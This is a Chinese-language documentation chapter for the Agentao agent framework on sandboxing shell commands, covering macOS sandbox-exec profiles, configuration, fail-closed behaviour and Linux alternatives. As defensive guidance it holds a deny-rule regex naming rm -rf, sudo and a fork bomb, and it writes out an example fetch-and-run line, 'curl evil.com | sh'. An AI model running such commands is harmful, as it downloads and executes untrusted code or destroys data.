# 6.2 Shell 沙箱与命令控制

> **本节你会学到**
> - Shell 的三层递进防护：PermissionEngine、`confirm_tool`、内核沙箱
> - macOS 三个 sandbox profile（`readonly` / `workspace-write` / `workspace-write-no-network`）
> - Linux 等价方案：容器、namespace、seccomp

`run_shell_command` 是 Agent 能力最强、也最危险的工具。Agentao 提供**三层递进**防护，按"越下层越贵、越严"排：

```
层 A · PermissionEngine   (每一层都应该开)
  └─ 规则允许 / 拒绝 / 问
层 B · confirm_tool        (交互场景)
  └─ 用户点击确认
层 C · macOS sandbox-exec  (默认关闭，需显式启用)
  └─ 内核级文件/网络隔离
```

A、B 在 [Part 4.5](/zh/part-4/5-tool-confirmation-ui) 与 [Part 5.4](/zh/part-5/4-permissions) 讲过。本节专注**层 C：系统级沙箱**。

## macOS sandbox-exec

macOS 自带 `sandbox-exec` 工具，内核级隔离文件写入和网络访问。Agentao 的 SandboxPolicy 在命令执行前**用它包一层**。

### 设计原则

- **只沙箱化 `run_shell_command`。** `sandbox-exec` 包的是子进程。`write_file`、`replace`、`web_fetch` 跑在 Agent 自己的进程里，没法事后套沙箱，只由权限引擎管。
- **沙箱和权限模式是两个独立维度。** 权限引擎决定命令**能不能跑**；沙箱决定放行之后命令**能做什么**。在 `/mode full-access` 下也可以开着沙箱兜底，每条 shell 命令照样被包。
- **默认关闭。** 沙箱会打断依赖网络的流程，比如 `npm install`、`pip install`、`git clone`。需要时在 `sandbox.json` 里开，或者 `/sandbox on`。
- **仅限 macOS。** 其他平台上策略静默关闭，见[跨平台注意](#跨平台注意)。

### 命令是怎么被包起来的

1. 调用被放行后，工具执行器向策略要一个 profile（[`runtime/tool_executor.py`](https://github.com/jin-bo/agentao/blob/main/agentao/runtime/tool_executor.py)），通过一个私有参数交给 shell 工具。模型和插件 hook 都看不到这个参数。
2. shell 工具把命令改写成 `/usr/bin/sandbox-exec -D _RW1=<workspace_root> -p <profile> <shell> -c '<command>'`（[`tools/shell.py::_wrap_with_sandbox`](https://github.com/jin-bo/agentao/blob/main/agentao/tools/shell.py)）。后台命令也一样被包。这里特意用绝对路径：沙箱内的命令能写 `PATH` 上的目录（比如 `.venv/bin`），放在那里的 `sandbox-exec` 不能接管下一条命令。
3. 内层的 `<shell>` 和不开沙箱时用的是同一个 shell（`resolve_shell_executable()`：有 bash 用 bash，否则 `/bin/sh`）。所以同一条命令开不开沙箱，解析方式都一样。
4. **沙箱自己的配置，在沙箱内永远写不了。** profile 以内联方式（`-p`）传入。内置 profile 传的是它的文本，在 agentao 被导入时读取一次：改写或删除已安装的 `.sb` 文件，影响不到正在运行的进程，所以装有 agentao 的项目 `.venv` 照样可写、可删。来自 `profiles_dir` 的用户 profile 以 `(import "<路径>")` 传入。profile 之后跟一条 `(deny file-write* …)`；后出现的规则优先，所以它压过 profile 里的 `allow`。不管工作区在哪，它都覆盖 `~/.agentao`（含 `sandbox.json`，以及之后会在沙箱外被读取的 `permissions.json` 和 `mcp.json`）和用户的 `profiles_dir`，因此 profile 允许写哪里都无关紧要。在工作区内，它还覆盖这些目录和工作区之间的每一级目录，以及软链接本身所在的位置，让它们没法被改名挪走再替换。工作区就是 `~/.agentao` 或某个 `profiles_dir`，或位于其中时，只禁写 `sandbox.json` 和那里的 `.sb` 文件（包括新建的）。否则一条命令就能往 `sandbox.json` 写 `{"enabled": false}`，或新增、改写 profile，影响之后的每一条命令（[`sandbox/policy.py::_protected_paths`](https://github.com/jin-bo/agentao/blob/main/agentao/sandbox/policy.py)）。`/sandbox status` 的预检查用的就是这同一组参数，外加一个空操作命令。

stdout、stderr 和退出码原样透传。

### 3 个内置 profile

| Profile | 能写文件 | 能联网 | 典型场景 |
|---------|---------|------|---------|
| `readonly` | 仅临时目录 | ❌ | 纯读分析、审计 |
| `workspace-write-no-network` | `_RW1` + 临时目录 | ❌ | 代码编辑（无网；内置默认） |
| `workspace-write` | `_RW1` + 临时目录 | ✅ | 需要联网的开发工作 |

"临时目录"指 `/tmp`、`/var/tmp`、对应的 `/private/...` 路径，以及 `/private/var/folders/`（每个用户的 `$TMPDIR`）。每个 profile 都允许写，因为很多工具会往那里写临时文件。三个 profile 也都允许读任意路径、允许 fork 和 exec。文件在 [`agentao/sandbox/profiles/`](https://github.com/jin-bo/agentao/tree/main/agentao/sandbox/profiles)。

`_RW1` 是 sandbox profile 里声明的可写路径变量，Agentao 会传入 `workspace_root`（默认 = 项目根）。

## 启用方式

### 最小配置

在 `~/.agentao/sandbox.json`：

```json
{
  "enabled": true,
  "default_profile": "workspace-write-no-network"
}
```

重启 Agent 后，所有 `run_shell_command` 调用都会被 sandbox-exec 包一层。`sandbox-exec` 不存在（非 macOS）时沙箱**静默降级**为不启用——这可能有安全风险，见"跨平台注意"章节。

### 配置字段

Agentao 只读 `~/.agentao/sandbox.json`。**`<project>/.agentao/sandbox.json` 会被忽略**：记一条 warning，并在 `/sandbox status` 和 `agentao doctor` 里显示被忽略的路径。项目里的文件可能来自克隆下来的仓库，也可能是沙箱内的命令写的（整个工作区都可写）。这样的文件不能关掉沙箱，也不能换 profile。项目级 `permissions.json` 被忽略也是同一个原因。

```json
{
  "enabled": false,
  "platform": "darwin",
  "default_profile": "workspace-write-no-network",
  "rules": [],
  "profiles_dir": null,
  "workspace_root": null
}
```

| 字段 | 含义 |
|------|------|
| `enabled` | 总开关，默认 `false`。 |
| `platform` | 只要不是 `"darwin"`，沙箱就关闭。 |
| `default_profile` | 没有 rule 命中时用的 profile。 |
| `rules` | 按工具覆盖。第一条 `tool` 匹配的 rule 生效；目前只有 `run_shell_command` 有意义。 |
| `profiles_dir` | 自定义 `.sb` 文件目录，搜索时排在内置 profile 前面。 |
| `workspace_root` | 作为 `_RW1` 传入的可写路径，默认是项目根。 |

`profiles_dir`、`workspace_root` 写相对路径时，以 `~/.agentao/` 为基准。加载逻辑在 [`sandbox/policy.py::load_sandbox_config`](https://github.com/jin-bo/agentao/blob/main/agentao/sandbox/policy.py)，每个字段都做类型检查，类型不对和 JSON 写错一样按 fail-closed 处理。

### 按命令类型选不同 profile

```json
{
  "enabled": true,
  "default_profile": "workspace-write-no-network",
  "rules": [
    {"tool": "run_shell_command", "profile": "workspace-write"}
  ]
}
```

目前 rule 匹配只按 `tool` 名字；未来版本可能支持按命令内容路由到不同 profile。

### 运行时开关

```python
from pathlib import Path
from agentao import Agentao
from agentao.sandbox import SandboxPolicy

policy = SandboxPolicy(project_root=Path("/data/tenant-a"))
policy.set_enabled(True)
policy.set_default_profile("workspace-write-no-network")
agent = Agentao(working_directory=Path("/data/tenant-a"), sandbox_policy=policy)
```

`set_enabled()`、`set_default_profile()` 是会话级覆盖，不会写回 `sandbox.json`。`build_from_environment()` 会按工作目录自动建一个 `SandboxPolicy`，除非你自己传了 `sandbox_policy=`。直接 `Agentao(...)` 不传则没有沙箱策略。

## 自定义 profile

把你的 `.sb` 文件放在 `profiles_dir` 下：

```json
{
  "enabled": true,
  "profiles_dir": "./sandbox-profiles",
  "default_profile": "my-strict"
}
```

相对的 `profiles_dir` 以 `~/.agentao/` 为基准，所以这里是 `~/.agentao/sandbox-profiles/`。和内置 profile 同名的文件会替换掉那个内置 profile。

建议复制一个内置 profile 再往窄里改。下面这个骨架和内置 profile 结构相同。`~/.agentao/sandbox-profiles/my-strict.sb`：

```scheme
(version 1)
(debug deny)
(import "system.sb")

(allow file-read*)

;; 写：只允许工作区里的一个子目录，加上临时目录
(allow file-write*
  (subpath (string-append (param "_RW1") "/build"))
  (subpath "/tmp")
  (subpath "/var/tmp")
  (subpath "/private/tmp")
  (subpath "/private/var/tmp")
  (literal "/dev/null")
  (regex #"^/private/var/folders/"))

(deny network*)   ;; 不写这一行，网络就是放开的

(allow process-fork)
(allow process-exec)
(allow signal (target self))
(allow mach-lookup)
(allow sysctl-read)
(allow ipc-posix-shm)
```

保留 `(import "system.sb")` 和进程相关的几条规则，否则连 shell 本身都起不来。Agentao 只传入 `_RW1` 这一个参数。

**sandbox profile 语法**：TinyScheme 的子集。参考 Apple 的 [Sandbox 文档](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/)或 macOS `/System/Library/Sandbox/Profiles/*.sb`。

## 手动验证

在 macOS 上用之前，先手动确认一遍：

1. 建 `~/.agentao/sandbox.json`：`{"enabled": true, "default_profile": "workspace-write-no-network"}`。
2. 运行 `uv run agentao`，`/sandbox status` 应显示 `enabled` 和对应 profile。
3. 让 Agent 执行 `echo hello > /tmp/ok.txt`：成功。
4. 让它执行 `echo bad > ~/sandbox-test.txt`：失败，报 `Operation not permitted`。
5. 让它执行 `curl https://example.com`：失败，通常报 `Could not resolve host`。
6. `/sandbox off` 后重试第 5 步：成功。

不经过 Agent，也可以直接用 `sandbox-exec` 测 profile：

```bash
/usr/bin/sandbox-exec -D _RW1="$PWD" -f ~/.agentao/sandbox-profiles/my-strict.sb /bin/bash -c 'touch build/x && echo ok'
```

在 Linux / Windows 上，`uv run agentao` 应正常启动，shell 命令不经包装直接执行。

## Fail-closed 语义

Agentao 的沙箱策略**严格 fail-closed**——配置有问题就拒绝执行，不会静默降级：

| 错误情形 | 行为 |
|---------|------|
| `~/.agentao/sandbox.json` JSON 解析失败或字段类型不对 | macOS 上每次 shell 调用都以 `SandboxMisconfiguredError` 失败，即使文件里根本没写 `enabled`；非 macOS 不开沙箱 |
| 引用的 profile 名字找不到 | 抛 `SandboxMisconfiguredError`，命令拒绝执行 |
| `/usr/bin/sandbox-exec` 不存在（macOS） | `/sandbox status` 会报出来；被包装的命令执行失败，绝不会不包装直接跑 |
| profile 文件语法错（Scheme 错） | `/sandbox status`、`/sandbox on`、`/sandbox profile <name>` 会用 `sandbox-exec` 实际加载一次 profile 并报错（`health_error()` / `profile_health_error()`）。构造时不检查。调用时 `sandbox-exec` 非零退出，错误原样交给模型 |

**含义**：生产环境 enabled=true 后，任何配置错误**都会**让 Shell 工具停摆——这是有意为之，比"无声禁用保护"好。配置坏了的时候，`/sandbox off` 依然有效，是兜底的逃生口。

## 沙箱拒绝命令时

被拒绝的操作不会让 Agent 崩溃：命令失败，模型照常拿到输出。如果输出里有 `Operation not permitted`、`deny file-write` 或 `deny network`，shell 工具会追加一段提示（[`tools/shell.py::_annotate_sandbox_denial`](https://github.com/jin-bo/agentao/blob/main/agentao/tools/shell.py)）：

```
[Sandbox hint] The command ran under macOS sandbox profile 'workspace-write-no-network'.
If the failure looks like a capability denial (file-write outside workspace, network
access, etc.) rather than a real command error, ask the user to run `/sandbox off` or
switch profile via `/sandbox profile <name>`.
```

这样模型会请用户放宽沙箱，而不是把沙箱错误当成命令 bug 去调。并非每个 `Operation not permitted` 都来自沙箱，所以这只是提示，不是定论。被拦的网络请求往往只表现为 DNS 错误：`Could not resolve host`（curl、git）、`getaddrinfo ENOTFOUND`（Node）或 `nodename nor servname provided`（Python）。普通的 DNS 失败也是这样，所以只有配置禁网时它们才带提示：有 `(deny network…)` 规则，或者 `(deny default)` 且没有 `(allow network…)` 规则。内置配置里就是 `readonly` 和 `workspace-write-no-network`。

## sandbox-exec 的局限

- **不能按域名限制网络**，只能全开或全关。要按域名控制，靠 `web_fetch` 加权限引擎规则（[6.3](./3-network-ssrf)）。
- **进沙箱前打开的文件描述符在沙箱里仍可用。** 不要在外面预先打开文件再传给子进程。
- **SIP 和 TCC 是独立的层**：`sandbox-exec` 绕不过它们，它们也绕不过 `sandbox-exec`。
- **性能开销很小**，大约 1–2%。
- **`sandbox-exec` 自 macOS 10.12 起被标为 deprecated**，但在当前 macOS 上照常工作，Bazel 等工具也在用。

## 跨平台注意

| OS | sandbox-exec 可用 | 建议 |
|----|-----------------|-----|
| macOS 13+ | ✅ | 直接用 |
| Linux | ❌ | 用容器 / namespaces / seccomp（见下） |
| Windows | ❌ | WSL2 / Docker Desktop |

Linux 上**没有**内建等效。常见替代方案：

**方案 1 · 容器隔离**

把 Agent 整个跑在 Docker 容器里，挂 read-only 根文件系统 + volume 白名单：

```bash
docker run --rm \
  --read-only \
  --tmpfs /tmp \
  -v $(pwd):/workspace \
  --network=none \
  -e OPENAI_API_KEY=$OPENAI_API_KEY \
  your-agent-image
```

**方案 2 · firejail / bwrap**

用轻量级沙箱工具包住 `run_shell_command`。目前 Agentao 没有内置，需要你自定义 `ShellTool`：

```python
from agentao.tools.shell import ShellTool
import shlex

class FirejailShellTool(ShellTool):
    def execute(self, command: str, **kw) -> str:
        wrapped = ["firejail", "--private=/tmp/sb", "--"] + shlex.split(command)
        return super().execute(command=" ".join(shlex.quote(a) for a in wrapped), **kw)
```

**方案 3 · 云平台隔离**

在 gVisor / Kata Containers / AWS Lambda 等隔离性更强的环境里跑 Agent。

## 什么场景值得开沙箱

| 场景 | 开还是不开 |
|------|---------|
| 开发者本地跑 Agentao CLI | 可开可不开（开了更稳） |
| 嵌入个人 SaaS 后端（单租户） | **开** |
| 多租户 SaaS（高风险） | **开 + 容器隔离双保险** |
| 可信内部工具 | 可不开 |
| 带 LLM 的 CI | **必开**（CI 环境天然不该跑任意命令） |

## 沙箱之外：命令内容过滤

即便开了沙箱，也要在**权限引擎**层先过滤命令字符串：

```json
{
  "rules": [
    {"tool": "run_shell_command", "args": {"command": "rm\\s+-rf|sudo|:\\(\\)\\{.*:|;.*:&"}, "action": "deny"},
    {"tool": "run_shell_command", "args": {"command": "^(git|ls|cat|grep) "}, "action": "allow"},
    {"tool": "run_shell_command", "action": "ask"}
  ]
}
```

沙箱防的是"命令造成的内核级伤害"；权限防的是"命令根本不该被执行"。两层叠加才稳。

## ⚠️ 常见陷阱

::: warning 上线前先确认这几条
- ❌ **只靠沙箱不做规则过滤** —— `sandbox-exec` 是在 LLM 决定执行**之后**才拒，PermissionEngine 要在更早一层拦下
- ❌ **自定义 profile 未验证** —— `.sb` 文件里一个拼写错误，就会让所有 shell 命令失败
- ❌ **`_RW1` 指错地方** —— 沙箱只允许写 `_RW1`，如果它不是你的 `workspace_root`，等于没法写

下面每一条都附完整修法。
:::

### ❌ 只靠沙箱不做规则过滤

沙箱能阻止 `rm -rf /` 删除系统文件，但它**阻止不了** `curl evil.com | sh` 下载恶意脚本到工作区再执行。规则层才能拦住后者。

### ❌ 自定义 profile 未验证

写完新 profile 不测就上线，一旦 TinyScheme 语法错误，所有命令直接失败。部署前手跑一次健康检查，或者用 `/sandbox profile my-strict` 切过去——它会做同样的检查：

```python
policy = SandboxPolicy(project_root=Path.cwd())
err = policy.profile_health_error("my-strict")
assert err is None, f"Profile broken: {err}"
```

### ❌ `_RW1` 指错地方

沙箱只允许写 `_RW1`，如果你希望 Agent 能写 `/tmp/output`，要么改 profile 加白，要么改 `workspace_root`。默认 `workspace_root = project root`。

## TL;DR

- **三层按顺序**：PermissionEngine（始终启用）→ `confirm_tool`（人机交互）→ macOS `sandbox-exec`（内核级，opt-in）。
- Profile：`readonly`（审计）、`workspace-write`（需要联网的开发）、`workspace-write-no-network`（内置默认，也适合 CI / 批处理）。
- 仅 macOS 有 `sandbox-exec`：Linux 生产用容器 + seccomp + 用户命名空间。前两层（PermissionEngine + `confirm_tool`）依然适用。
- 容器内沙箱配置 mount 为只读——Agent 不能改自己的 profile。

→ [6.3 网络与 SSRF 防护](./3-network-ssrf)
